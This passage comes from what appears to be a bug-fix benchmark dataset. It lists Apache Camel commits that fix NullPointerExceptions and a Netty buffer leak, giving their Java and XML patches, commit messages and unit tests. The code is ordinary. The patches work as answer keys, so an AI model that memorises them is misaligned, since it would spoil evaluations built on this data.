                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-cxf/src/test/java/org/apache/camel/component/cxf/RouteBuilderCxfTracer.java?ref=6c7d57dac6e35c6140cbd5cc15cb4fc6c7e2cb02",
                "deletions": 0,
                "filename": "components/camel-cxf/src/test/java/org/apache/camel/component/cxf/RouteBuilderCxfTracer.java",
                "patch": "@@ -0,0 +1,73 @@\n+/**\n+ * Licensed to the Apache Software Foundation (ASF) under one or more\n+ * contributor license agreements.  See the NOTICE file distributed with\n+ * this work for additional information regarding copyright ownership.\n+ * The ASF licenses this file to You under the Apache License, Version 2.0\n+ * (the \"License\"); you may not use this file except in compliance with\n+ * the License.  You may obtain a copy of the License at\n+ *\n+ *      http://www.apache.org/licenses/LICENSE-2.0\n+ *\n+ * Unless required by applicable law or agreed to in writing, software\n+ * distributed under the License is distributed on an \"AS IS\" BASIS,\n+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n+ * See the License for the specific language governing permissions and\n+ * limitations under the License.\n+ */\n+package org.apache.camel.component.cxf;\n+\n+import org.apache.camel.Exchange;\n+import org.apache.camel.Processor;\n+import org.apache.camel.builder.RouteBuilder;\n+import org.apache.camel.non_wrapper.types.GetPerson;\n+import org.apache.camel.non_wrapper.types.GetPersonResponse;\n+import org.apache.camel.processor.DelegateProcessor;\n+import org.apache.cxf.message.MessageContentsList;\n+\n+\n+public class RouteBuilderCxfTracer extends RouteBuilder {\n+    @Override\n+    public void configure() throws Exception {        \n+        from(\"cxf:http://localhost:9000/PersonService/\" \n+            + \"?serviceClass=org.apache.camel.non_wrapper.Person\"\n+            + \"&serviceName={http://camel.apache.org/non-wrapper}PersonService\"\n+            + \"&portName={http://camel.apache.org/non-wrapper}soap\"\n+            + \"&dataFormat=POJO\")\n+            .intercept(new MyDelegate()).to(\"direct:something\");\n+\n+        from(\"direct:something\")\n+            .process(new DoSomethingProcessor())\n+            .process(new DoNothingProcessor());\n+    }\n+    \n+    private class DoSomethingProcessor implements Processor {\n+        public void process(Exchange exchange) throws Exception {\n+            exchange.getOut().setBody(exchange.getIn().getBody() + \" world!\");        \n+        }\n+    }\n+    \n+    private class DoNothingProcessor implements Processor {\n+        public void process(Exchange exchange) throws Exception {\n+            exchange.getOut().setBody(exchange.getIn().getBody());        \n+        }\n+    }\n+     \n+    private class MyDelegate extends DelegateProcessor {\n+        @Override\n+        protected void processNext(Exchange e) throws Exception {\n+            MessageContentsList mclIn = (MessageContentsList) e.getIn().getBody();\n+            e.getIn().setBody(((GetPerson) mclIn.get(0)).getPersonId(), String.class);\n+            \n+            super.processNext(e);           \n+            \n+            GetPersonResponse gpr = new GetPersonResponse();\n+            gpr.setName(\"Bill\");\n+            gpr.setPersonId(e.getOut().getBody(String.class));\n+            gpr.setSsn(\"Test\");\n+            \n+            MessageContentsList mclOut = new MessageContentsList();\n+            mclOut.set(0, gpr);\n+            e.getOut().setBody(mclOut, MessageContentsList.class);\n+        }\n+    }\n+}\n\\ No newline at end of file",
                "raw_url": "https://github.com/apache/camel/raw/6c7d57dac6e35c6140cbd5cc15cb4fc6c7e2cb02/components/camel-cxf/src/test/java/org/apache/camel/component/cxf/RouteBuilderCxfTracer.java",
                "sha": "210a285eef0063351a74f7c00c5f929c2b067188",
                "status": "added"
            },
            {
                "additions": 47,
                "blob_url": "https://github.com/apache/camel/blob/6c7d57dac6e35c6140cbd5cc15cb4fc6c7e2cb02/components/camel-cxf/src/test/java/org/apache/camel/component/cxf/TestCamel1145Route.java",
                "changes": 47,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-cxf/src/test/java/org/apache/camel/component/cxf/TestCamel1145Route.java?ref=6c7d57dac6e35c6140cbd5cc15cb4fc6c7e2cb02",
                "deletions": 0,
                "filename": "components/camel-cxf/src/test/java/org/apache/camel/component/cxf/TestCamel1145Route.java",
                "patch": "@@ -0,0 +1,47 @@\n+/**\n+ * Licensed to the Apache Software Foundation (ASF) under one or more\n+ * contributor license agreements.  See the NOTICE file distributed with\n+ * this work for additional information regarding copyright ownership.\n+ * The ASF licenses this file to You under the Apache License, Version 2.0\n+ * (the \"License\"); you may not use this file except in compliance with\n+ * the License.  You may obtain a copy of the License at\n+ *\n+ *      http://www.apache.org/licenses/LICENSE-2.0\n+ *\n+ * Unless required by applicable law or agreed to in writing, software\n+ * distributed under the License is distributed on an \"AS IS\" BASIS,\n+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n+ * See the License for the specific language governing permissions and\n+ * limitations under the License.\n+ */\n+\n+package org.apache.camel.component.cxf;\n+\n+import java.net.URL;\n+\n+import javax.xml.namespace.QName;\n+\n+import org.apache.camel.non_wrapper.Person;\n+import org.apache.camel.non_wrapper.PersonService;\n+import org.apache.camel.non_wrapper.types.GetPerson;\n+import org.apache.camel.non_wrapper.types.GetPersonResponse;\n+import org.springframework.test.context.ContextConfiguration;\n+import org.springframework.test.context.junit38.AbstractJUnit38SpringContextTests;\n+\n+@ContextConfiguration(locations = { \"/org/apache/camel/component/cxf/context-camel-1145.xml\" })\n+public class TestCamel1145Route extends AbstractJUnit38SpringContextTests {\n+\n+    public void testCamel1145Route() throws Exception {\n+        URL wsdlURL = new URL(\"http://localhost:9000/PersonService/?wsdl\");\n+        PersonService ss = new PersonService(wsdlURL, new QName(\"http://camel.apache.org/non-wrapper\", \"PersonService\"));\n+        Person client = ss.getSoap();\n+        GetPerson request = new GetPerson();\n+        request.setPersonId(\"hello\");\n+        GetPersonResponse response = client.getPerson(request);\n+\n+        assertEquals(\"we should get the right answer from router\", \"Bill\", response.getName());\n+        assertEquals(\"we should get the right answer from router\", \"Test\", response.getSsn());\n+        assertEquals(\"we should get the right answer from router\", \"hello world!\", response.getPersonId());\n+\n+    }\n+}",
                "raw_url": "https://github.com/apache/camel/raw/6c7d57dac6e35c6140cbd5cc15cb4fc6c7e2cb02/components/camel-cxf/src/test/java/org/apache/camel/component/cxf/TestCamel1145Route.java",
                "sha": "20d8a8f698e84a031eaa92b07d497989dad0c71b",
                "status": "added"
            },
            {
                "additions": 60,
                "blob_url": "https://github.com/apache/camel/blob/6c7d57dac6e35c6140cbd5cc15cb4fc6c7e2cb02/components/camel-cxf/src/test/resources/org/apache/camel/component/cxf/context-camel-1145.xml",
                "changes": 60,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-cxf/src/test/resources/org/apache/camel/component/cxf/context-camel-1145.xml?ref=6c7d57dac6e35c6140cbd5cc15cb4fc6c7e2cb02",
                "deletions": 0,
                "filename": "components/camel-cxf/src/test/resources/org/apache/camel/component/cxf/context-camel-1145.xml",
                "patch": "@@ -0,0 +1,60 @@\n+<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n+<!--\n+    Licensed to the Apache Software Foundation (ASF) under one or more\n+    contributor license agreements.  See the NOTICE file distributed with\n+    this work for additional information regarding copyright ownership.\n+    The ASF licenses this file to You under the Apache License, Version 2.0\n+    (the \"License\"); you may not use this file except in compliance with\n+    the License.  You may obtain a copy of the License at\n+\n+    http://www.apache.org/licenses/LICENSE-2.0\n+\n+    Unless required by applicable law or agreed to in writing, software\n+    distributed under the License is distributed on an \"AS IS\" BASIS,\n+    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n+    See the License for the specific language governing permissions and\n+    limitations under the License.\n+-->\n+<beans xmlns=\"http://www.springframework.org/schema/beans\"\n+       xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n+       xmlns:camel=\"http://activemq.apache.org/camel/schema/spring\"\n+       xmlns:jaxws=\"http://cxf.apache.org/jaxws\"\n+       xmlns:http=\"http://cxf.apache.org/transports/http/configuration\"\n+       xmlns:httpj=\"http://cxf.apache.org/transports/http-jetty/configuration\"\n+       \n+       xsi:schemaLocation=\"\n+       http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-2.0.xsd\n+       http://activemq.apache.org/camel/schema/spring http://activemq.apache.org/camel/schema/spring/camel-spring.xsd\n+       http://cxf.apache.org/jaxws http://cxf.apache.org/schemas/jaxws.xsd\n+       http://cxf.apache.org/transports/http-jetty/configuration http://cxf.apache.org/schemas/configuration/http-jetty.xsd\n+       http://cxf.apache.org/transports/http/configuration http://cxf.apache.org/schemas/configuration/http-conf.xsd\n+       http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-2.5.xsd\n+\t   http://www.springframework.org/schema/lang http://www.springframework.org/schema/lang/spring-lang-2.5.xsd\n+\t   http://activemq.apache.org/camel/schema/spring http://activemq.apache.org/camel/schema/spring/camel-spring.xsd\n+    \">\n+\n+    <camel:camelContext id=\"camelJiraContext\">\n+        <camel:jmxAgent id=\"agent\" disabled=\"true\" />\n+    </camel:camelContext>\n+\n+\t<bean id=\"camelTracer\" class=\"org.apache.camel.processor.interceptor.Tracer\">\n+\t\t<property name=\"enabled\" value=\"true\"/>\n+    \t<property name=\"traceExceptions\" value=\"true\"/>\n+    \t<property name=\"traceInterceptors\" value=\"true\"/>\n+    \t<property name=\"logLevel\" value=\"INFO\"/>\n+\t</bean>\n+\t\n+\t<bean id=\"traceFormatter\" class=\"org.apache.camel.processor.interceptor.TraceFormatter\">\n+    \t<property name=\"showBody\" value=\"true\"/>\n+    \t<property name=\"showBodyType\" value=\"true\"/>\n+    \t<property name=\"showProperties\" value=\"true\"/>\n+    \t<property name=\"showHeaders\" value=\"true\"/>\n+\t</bean>\n+\n+    <bean id=\"producerTemplate\" \n+        factory-bean=\"camelJiraContext\"\n+        factory-method=\"createProducerTemplate\">\n+    </bean>\n+  \n+  \t<bean class=\"org.apache.camel.component.cxf.RouteBuilderCxfTracer\"/>\n+</beans>\n\\ No newline at end of file",
                "raw_url": "https://github.com/apache/camel/raw/6c7d57dac6e35c6140cbd5cc15cb4fc6c7e2cb02/components/camel-cxf/src/test/resources/org/apache/camel/component/cxf/context-camel-1145.xml",
                "sha": "621e43c1afde1363474e6100b947393f98209263",
                "status": "added"
            }
        ],
        "message": "CAMEL-1145 fixed the NPE after the copy work of CxfExchange\n\ngit-svn-id: https://svn.apache.org/repos/asf/activemq/camel/trunk@723325 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/cadbc9cce3b3045670af46e48fef13798cc4d47d",
        "patched_files": [
            "RouteBuilderCxfTracer.java",
            "context-camel-1145.java",
            "pom.java",
            "CxfExchange.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "TestCamel1145Route.java"
        ]
    },
    "camel_6d63a50": {
        "bug_id": "camel_6d63a50",
        "commit": "https://github.com/apache/camel/commit/6d63a50288125a88b97776cf1e3c14ff6c54638e",
        "file": [
            {
                "additions": 16,
                "blob_url": "https://github.com/apache/camel/blob/6d63a50288125a88b97776cf1e3c14ff6c54638e/camel-core/src/main/java/org/apache/camel/component/log/LogFormatter.java",
                "changes": 20,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/component/log/LogFormatter.java?ref=6d63a50288125a88b97776cf1e3c14ff6c54638e",
                "deletions": 4,
                "filename": "camel-core/src/main/java/org/apache/camel/component/log/LogFormatter.java",
                "patch": "@@ -167,12 +167,24 @@ public String format(Exchange exchange) {\n                 }\n             }\n \n-            // get rid of the leading space comma if needed\n-            return \"Exchange[\" + (multiline ? answer.append(']').toString() : answer.toString().substring(2) + \"]\");\n+            // switch string buffer\n+            sb = answer;\n         }\n \n-        // get rid of the leading space comma if needed\n-        return \"Exchange[\" + (multiline ? sb.append(']').toString() : sb.toString().substring(2) + \"]\");\n+        if (multiline) {\n+            sb.insert(0, \"Exchange[\");\n+            sb.append(\"]\");\n+            return sb.toString();\n+        } else {\n+            // get rid of the leading space comma if needed\n+            if (sb.length() > 0 && sb.charAt(0) == ',' && sb.charAt(1) == ' ') {\n+                sb.replace(0, 2, \"\");\n+            }\n+            sb.insert(0, \"Exchange[\");\n+            sb.append(\"]\");\n+\n+            return sb.toString();\n+        }\n     }\n \n     public boolean isShowExchangeId() {",
                "raw_url": "https://github.com/apache/camel/raw/6d63a50288125a88b97776cf1e3c14ff6c54638e/camel-core/src/main/java/org/apache/camel/component/log/LogFormatter.java",
                "sha": "c19097444e182dc34b264a62bea8c06b8392c526",
                "status": "modified"
            },
            {
                "additions": 4,
                "blob_url": "https://github.com/apache/camel/blob/6d63a50288125a88b97776cf1e3c14ff6c54638e/camel-core/src/test/java/org/apache/camel/component/log/LogFormatterTest.java",
                "changes": 4,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/test/java/org/apache/camel/component/log/LogFormatterTest.java?ref=6d63a50288125a88b97776cf1e3c14ff6c54638e",
                "deletions": 0,
                "filename": "camel-core/src/test/java/org/apache/camel/component/log/LogFormatterTest.java",
                "patch": "@@ -34,6 +34,10 @@ public void testSendMessageToLogDefault() throws Exception {\n         template.sendBody(\"log:org.apache.camel.TEST\", \"Hello World\");\n     }\n \n+    public void testSendMessageToLogAllOff() throws Exception {\n+        template.sendBody(\"log:org.apache.camel.TEST?showBody=false&showBodyType=false&showExchangePattern=false\", \"Hello World\");\n+    }\n+\n     public void testSendMessageToLogSingleOptions() throws Exception {\n         template.sendBody(\"log:org.apache.camel.TEST?showExchangeId=true\", \"Hello World\");\n         template.sendBody(\"log:org.apache.camel.TEST?showExchangePattern=true\", \"Hello World\");",
                "raw_url": "https://github.com/apache/camel/raw/6d63a50288125a88b97776cf1e3c14ff6c54638e/camel-core/src/test/java/org/apache/camel/component/log/LogFormatterTest.java",
                "sha": "5267c2fb74a16b7fd304dbf312a61e2feedc696e",
                "status": "modified"
            }
        ],
        "message": "CAMEL-5699: Fixed NPE if all options disable on log formatter.\n\ngit-svn-id: https://svn.apache.org/repos/asf/camel/trunk@1415129 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/87482401614e9c2387d02f0e92ee34ea0f3fe8be",
        "patched_files": [
            "LogFormatter.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "LogFormatterTest.java"
        ]
    },
    "camel_7016406": {
        "bug_id": "camel_7016406",
        "commit": "https://github.com/apache/camel/commit/70164066813e49623ba1cab9176e33bbdc74eef2",
        "file": [
            {
                "additions": 6,
                "blob_url": "https://github.com/apache/camel/blob/70164066813e49623ba1cab9176e33bbdc74eef2/components/camel-netty4/src/main/java/org/apache/camel/component/netty4/NettyConverter.java",
                "changes": 8,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-netty4/src/main/java/org/apache/camel/component/netty4/NettyConverter.java?ref=70164066813e49623ba1cab9176e33bbdc74eef2",
                "deletions": 2,
                "filename": "components/camel-netty4/src/main/java/org/apache/camel/component/netty4/NettyConverter.java",
                "patch": "@@ -36,7 +36,6 @@\n import org.apache.camel.Converter;\n import org.apache.camel.Exchange;\n \n-\n /**\n  * A set of converter methods for working with Netty types\n  *\n@@ -56,7 +55,12 @@ private NettyConverter() {\n         }\n         byte[] bytes = new byte[buffer.readableBytes()];\n         int readerIndex = buffer.readerIndex();\n-        buffer.getBytes(readerIndex, bytes);\n+        buffer.retain();\n+        try {\n+            buffer.getBytes(readerIndex, bytes);\n+        } finally {\n+            buffer.release();\n+        }\n         return bytes;\n     }\n ",
                "raw_url": "https://github.com/apache/camel/raw/70164066813e49623ba1cab9176e33bbdc74eef2/components/camel-netty4/src/main/java/org/apache/camel/component/netty4/NettyConverter.java",
                "sha": "c3af8db4e573f8ab8fa01f77fd7338ea1d93a83d",
                "status": "modified"
            },
            {
                "additions": 0,
                "blob_url": "https://github.com/apache/camel/blob/70164066813e49623ba1cab9176e33bbdc74eef2/components/camel-netty4/src/test/java/org/apache/camel/component/netty4/MyCustomCodec.java",
                "changes": 2,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-netty4/src/test/java/org/apache/camel/component/netty4/MyCustomCodec.java?ref=70164066813e49623ba1cab9176e33bbdc74eef2",
                "deletions": 2,
                "filename": "components/camel-netty4/src/test/java/org/apache/camel/component/netty4/MyCustomCodec.java",
                "patch": "@@ -58,8 +58,6 @@ protected void decode(ChannelHandlerContext ctx, ByteBuf msg, List<Object> out)\n                 int readerIndex = msg.readerIndex();\n                 msg.getBytes(readerIndex, bytes);\n                 out.add(bytes);\n-            } else {\n-                out.add((byte[])null);\n             }\n         }\n ",
                "raw_url": "https://github.com/apache/camel/raw/70164066813e49623ba1cab9176e33bbdc74eef2/components/camel-netty4/src/test/java/org/apache/camel/component/netty4/MyCustomCodec.java",
                "sha": "a20069ea4e5f0c30f0ce8e62ebef10df9a2a1d07",
                "status": "modified"
            },
            {
                "additions": 7,
                "blob_url": "https://github.com/apache/camel/blob/70164066813e49623ba1cab9176e33bbdc74eef2/components/camel-netty4/src/test/java/org/apache/camel/component/netty4/NettyConverterTest.java",
                "changes": 9,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-netty4/src/test/java/org/apache/camel/component/netty4/NettyConverterTest.java?ref=70164066813e49623ba1cab9176e33bbdc74eef2",
                "deletions": 2,
                "filename": "components/camel-netty4/src/test/java/org/apache/camel/component/netty4/NettyConverterTest.java",
                "patch": "@@ -20,6 +20,7 @@\n import io.netty.buffer.PooledByteBufAllocator;\n import org.apache.camel.impl.DefaultExchange;\n import org.apache.camel.test.junit4.CamelTestSupport;\n+import org.junit.After;\n import org.junit.Before;\n import org.junit.Test;\n \n@@ -31,7 +32,7 @@\n     /**\n      * Test payload to send.\n      */\n-    private  static final String PAYLOAD = \"Test Message\";\n+    private static final String PAYLOAD = \"Test Message\";\n \n     private ByteBuf buf;\n \n@@ -42,14 +43,18 @@ public void startUp() {\n         buf.writeBytes(bytes);\n     }\n \n+    @After\n+    public void tearDown() {\n+        buf.release();\n+    }\n+\n     @Test\n     public void testConversionWithExchange() {\n         String result = context.getTypeConverter().convertTo(String.class, new DefaultExchange(context), buf);\n         assertNotNull(result);\n         assertEquals(PAYLOAD, result);\n     }\n \n-\n     @Test\n     public void testConversionWithoutExchange() {\n         String result = context.getTypeConverter().convertTo(String.class, buf);",
                "raw_url": "https://github.com/apache/camel/raw/70164066813e49623ba1cab9176e33bbdc74eef2/components/camel-netty4/src/test/java/org/apache/camel/component/netty4/NettyConverterTest.java",
                "sha": "7023b96ef91c9713cb0d1a4fe200cdb312aa81a9",
                "status": "modified"
            }
        ],
        "message": "CAMEL-9040: Fixed netty leak in unit test and a NPE",
        "parent": "https://github.com/apache/camel/commit/1cca6b7c1d5445c3d75ae6b1d3abbf6c1568eafa",
        "patched_files": [
            "NettyConverter.java",
            "MyCustomCodec.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "NettyConverterTest.java"
        ]
    },
    "camel_70b4008": {
        "bug_id": "camel_70b4008",
        "commit": "https://github.com/apache/camel/commit/70b40086608ca99bebd563d97a2b5f3c15488495",
        "file": [
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/70b40086608ca99bebd563d97a2b5f3c15488495/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/CxfConsumer.java",
                "changes": 2,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/CxfConsumer.java?ref=70b40086608ca99bebd563d97a2b5f3c15488495",
                "deletions": 1,
                "filename": "components/camel-cxf/src/main/java/org/apache/camel/component/cxf/CxfConsumer.java",
                "patch": "@@ -152,7 +152,7 @@ private Object syncInvoke(Exchange cxfExchange) {\n \n                 BindingOperationInfo boi = cxfExchange.getBindingOperationInfo();\n                 // make sure the \"boi\" is remained as wrapped in PAYLOAD mode\n-                if (dataFormat == DataFormat.PAYLOAD && boi.isUnwrapped()) {\n+                if (boi != null && dataFormat == DataFormat.PAYLOAD && boi.isUnwrapped()) {\n                     boi = boi.getWrappedOperation();\n                     cxfExchange.put(BindingOperationInfo.class, boi);\n                 }",
                "raw_url": "https://github.com/apache/camel/raw/70b40086608ca99bebd563d97a2b5f3c15488495/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/CxfConsumer.java",
                "sha": "a8c29f8364d07c0c52b547ce9caaf71b13797e3d",
                "status": "modified"
            }
        ],
        "message": "[CAMEL-6625]potential NPE in CxfConsumer if the PAYLOAD not match the ServiceModel",
        "parent": "https://github.com/apache/camel/commit/7c066bf4e16acd4aeec8f46c41e34b0355b01431",
        "patched_files": [
            "CxfConsumer.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "CxfConsumerTest.java"
        ]
    },
    "camel_721a617": {
        "bug_id": "camel_721a617",
        "commit": "https://github.com/apache/camel/commit/721a6179cf60dcae61f2430197f2aa10f6a52442",
        "file": [
            {
                "additions": 6,
                "blob_url": "https://github.com/apache/camel/blob/721a6179cf60dcae61f2430197f2aa10f6a52442/camel-core/src/main/java/org/apache/camel/component/file/GenericFileConverter.java",
                "changes": 7,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/component/file/GenericFileConverter.java?ref=721a6179cf60dcae61f2430197f2aa10f6a52442",
                "deletions": 1,
                "filename": "camel-core/src/main/java/org/apache/camel/component/file/GenericFileConverter.java",
                "patch": "@@ -61,7 +61,12 @@ public static Object convertTo(Class<?> type, Exchange exchange, Object value, T\n \n     @Converter\n     public static String convertToString(GenericFile file, Exchange exchange) {\n-        return exchange.getContext().getTypeConverter().convertTo(String.class, file.getBody());\n+        if (exchange != null) {\n+            return exchange.getContext().getTypeConverter().convertTo(String.class, file.getBody());\n+        } else {\n+            // should revert to fallback converter if we dont have an exchange \n+            return null;\n+        }\n     }\n \n }",
                "raw_url": "https://github.com/apache/camel/raw/721a6179cf60dcae61f2430197f2aa10f6a52442/camel-core/src/main/java/org/apache/camel/component/file/GenericFileConverter.java",
                "sha": "3434052de84884962abfc408f83d5fa244c562a6",
                "status": "modified"
            }
        ],
        "message": "Fixed NPE if exchange was null, eg from mina UDP codec\n\ngit-svn-id: https://svn.apache.org/repos/asf/camel/trunk@761885 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/88ca359343c3a96786d435985f46841eeffcfb6e",
        "patched_files": [
            "GenericFileConverter.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "GenericFileConverterTest.java"
        ]
    },
    "camel_722b4dc": {
        "bug_id": "camel_722b4dc",
        "commit": "https://github.com/apache/camel/commit/722b4dc56615974b7e1ea87d441972369ee60ffd",
        "file": [
            {
                "additions": 16,
                "blob_url": "https://github.com/apache/camel/blob/722b4dc56615974b7e1ea87d441972369ee60ffd/camel-core/src/main/java/org/apache/camel/util/PackageHelper.java",
                "changes": 30,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/util/PackageHelper.java?ref=722b4dc56615974b7e1ea87d441972369ee60ffd",
                "deletions": 14,
                "filename": "camel-core/src/main/java/org/apache/camel/util/PackageHelper.java",
                "patch": "@@ -44,23 +44,25 @@ private PackageHelper() {\n     public static boolean isValidVersion(String packageName, double minimumVersion) {\n         try {\n             Package spring = Package.getPackage(packageName);\n-            String value = spring.getImplementationVersion();\n-            if (value != null) {\n-                // lets remove any extra dots in the string...\n-                int idx = value.indexOf('.');\n-                if (idx >= 0) {\n-                    StringBuffer buffer = new StringBuffer(value.substring(0, ++idx));\n-                    int i = idx;\n-                    for (int size = value.length(); i < size; i++) {\n-                        char ch = value.charAt(i);\n-                        if (Character.isDigit(ch)) {\n-                            buffer.append(ch);\n+            if (spring != null) {\n+                String value = spring.getImplementationVersion();\n+                if (value != null) {\n+                    // lets remove any extra dots in the string...\n+                    int idx = value.indexOf('.');\n+                    if (idx >= 0) {\n+                        StringBuffer buffer = new StringBuffer(value.substring(0, ++idx));\n+                        int i = idx;\n+                        for (int size = value.length(); i < size; i++) {\n+                            char ch = value.charAt(i);\n+                            if (Character.isDigit(ch)) {\n+                                buffer.append(ch);\n+                            }\n                         }\n+                        value = buffer.toString();\n                     }\n-                    value = buffer.toString();\n+                    double number = Double.parseDouble(value);\n+                    return number >= minimumVersion;\n                 }\n-                double number = Double.parseDouble(value);\n-                return number >= minimumVersion;\n             }\n         } catch (Exception e) {\n             LOG.debug(\"Failed to find out \" + packageName + \" version: \" + e, e);",
                "raw_url": "https://github.com/apache/camel/raw/722b4dc56615974b7e1ea87d441972369ee60ffd/camel-core/src/main/java/org/apache/camel/util/PackageHelper.java",
                "sha": "89b115bede10029e42e7fadeaa5c704fee28d2f0",
                "status": "modified"
            }
        ],
        "message": "CAMEL-1529 Fixed the NPE issue\n\ngit-svn-id: https://svn.apache.org/repos/asf/camel/trunk@767824 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/761ea13e803f7203dbe62961c082cd6b68807383",
        "patched_files": [
            "PackageHelper.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "PackageHelperTest.java"
        ]
    },
    "camel_72b3e17": {
        "bug_id": "camel_72b3e17",
        "commit": "https://github.com/apache/camel/commit/72b3e17f7419881383e412b831e15aec3ba83375",
        "file": [
            {
                "additions": 9,
                "blob_url": "https://github.com/apache/camel/blob/72b3e17f7419881383e412b831e15aec3ba83375/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/DefaultCxfBinding.java",
                "changes": 16,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/DefaultCxfBinding.java?ref=72b3e17f7419881383e412b831e15aec3ba83375",
                "deletions": 7,
                "filename": "components/camel-cxf/src/main/java/org/apache/camel/component/cxf/DefaultCxfBinding.java",
                "patch": "@@ -686,13 +686,15 @@ protected void propagateHeadersFromCamelToCxf(Exchange camelExchange,\n                 continue;\n             }\n             \n-            // things that are not filtered and not specifically copied will be put in transport headers\n-            if (entry.getValue() instanceof List) {\n-                transportHeaders.put(entry.getKey(), (List<String>)entry.getValue());\n-            } else {\n-                List<String> listValue = new ArrayList<String>();\n-                listValue.add(entry.getValue().toString());\n-                transportHeaders.put(entry.getKey(), listValue);\n+            if (ObjectHelper.isNotEmpty(entry.getValue())) {\n+                // things that are not filtered and not specifically copied will be put in transport headers\n+                if (entry.getValue() instanceof List) {\n+                    transportHeaders.put(entry.getKey(), (List<String>)entry.getValue());\n+                } else {\n+                    List<String> listValue = new ArrayList<String>();\n+                    listValue.add(entry.getValue().toString());\n+                    transportHeaders.put(entry.getKey(), listValue);\n+                }\n             }\n             \n         }",
                "raw_url": "https://github.com/apache/camel/raw/72b3e17f7419881383e412b831e15aec3ba83375/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/DefaultCxfBinding.java",
                "sha": "13f035b2b8268977fa072896506a0a7eeb719858",
                "status": "modified"
            }
        ],
        "message": "CAMEL-9853: Camel-CXF: Possible NPE in DefaultCXFBinding",
        "parent": "https://github.com/apache/camel/commit/d350c5f270a1e47d675242234ec3ef787ca923a0",
        "patched_files": [
            "DefaultCxfBinding.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "DefaultCxfBindingTest.java"
        ]
    },
    "camel_72d8e95": {
        "bug_id": "camel_72d8e95",
        "commit": "https://github.com/apache/camel/commit/72d8e95308942880ab87f6cbe2ec3dfa0f33b2dd",
        "file": [
            {
                "additions": 4,
                "blob_url": "https://github.com/apache/camel/blob/72d8e95308942880ab87f6cbe2ec3dfa0f33b2dd/components/camel-spring-batch/src/main/java/org/apache/camel/component/spring/batch/SpringBatchProducer.java",
                "changes": 5,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-spring-batch/src/main/java/org/apache/camel/component/spring/batch/SpringBatchProducer.java?ref=72d8e95308942880ab87f6cbe2ec3dfa0f33b2dd",
                "deletions": 1,
                "filename": "components/camel-spring-batch/src/main/java/org/apache/camel/component/spring/batch/SpringBatchProducer.java",
                "patch": "@@ -56,8 +56,11 @@ protected JobParameters prepareJobParameters(Map<String, Object> headers) {\n                 parametersBuilder.addLong(headerKey, (Long) headerValue);\n             } else if (headerValue instanceof Double) {\n                 parametersBuilder.addDouble(headerKey, (Double) headerValue);\n-            } else {\n+            } else if (headerValue != null){\n                 parametersBuilder.addString(headerKey, headerValue.toString());\n+            } else {\n+                // if the value is null we just put String with null value here to avoid the NPE\n+                parametersBuilder.addString(headerKey, null);\n             }\n         }\n         return parametersBuilder.toJobParameters();",
                "raw_url": "https://github.com/apache/camel/raw/72d8e95308942880ab87f6cbe2ec3dfa0f33b2dd/components/camel-spring-batch/src/main/java/org/apache/camel/component/spring/batch/SpringBatchProducer.java",
                "sha": "ca812d99036932aa2eac02cbff4a9904e0ffdc4c",
                "status": "modified"
            },
            {
                "additions": 16,
                "blob_url": "https://github.com/apache/camel/blob/72d8e95308942880ab87f6cbe2ec3dfa0f33b2dd/components/camel-spring-batch/src/test/java/org/apache/camel/component/spring/batch/SpringBatchEndpointTest.java",
                "changes": 16,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-spring-batch/src/test/java/org/apache/camel/component/spring/batch/SpringBatchEndpointTest.java?ref=72d8e95308942880ab87f6cbe2ec3dfa0f33b2dd",
                "deletions": 0,
                "filename": "components/camel-spring-batch/src/test/java/org/apache/camel/component/spring/batch/SpringBatchEndpointTest.java",
